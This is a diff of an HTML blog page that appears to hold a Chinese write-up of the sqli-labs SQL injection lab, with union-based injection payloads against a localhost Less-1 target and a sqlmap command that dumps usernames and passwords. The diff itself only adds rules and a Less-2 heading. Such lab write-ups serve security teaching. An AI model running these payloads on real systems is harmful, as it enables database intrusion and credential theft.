@@ -86,7 +86,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/1.png" class></div>
+        <hr>
+<div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/1.png" class></div>
 
 <h3 id="一、error-based"><a href="#一、error-based" class="headerlink" title="一、error_based"></a>一、error_based</h3><p>显错注入-联合查询:知识点</p>
 <p>1.判断注入点：以第一种为例id=1’ 在1后面加上单引号，页面出错；id=1 and 1=1 正常 id=1 and 1=2 错误</p>
@@ -98,6 +99,7 @@
 <p>​    c.查询字段名：</p>
 <p>and 1=2 union select 1,column_name from information_schema.columns where table_schema=’库名’ and table_name=’表名’ limit 0,1</p>
 <p>​    d.查询字段内容<br>and 1=2 union select 1,name from ‘表名’</p>
+<hr>
 <h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><h5 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h5><p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> 报错找到注入点</p>
 <p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> union select 1,2,3–+ 确定位数</p>
 <p><a href="http://localhost/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1&#39;</a> and 1=2 union select 1,2,database()–+ 确定当前数据库名字</p>
@@ -126,6 +128,9 @@
 
 <p>python2 sqlmap.py -u <a href="http://localhost/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1</a> –dump -C “username,password” -T “users” -D “security”</p>
 <div style="width:100%;margin:auto"><img src="/2020/09/27/ctf-web7/9.png" class></div>
+
+<hr>
+<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3>
       
     </div>
     <footer class="article-footer">
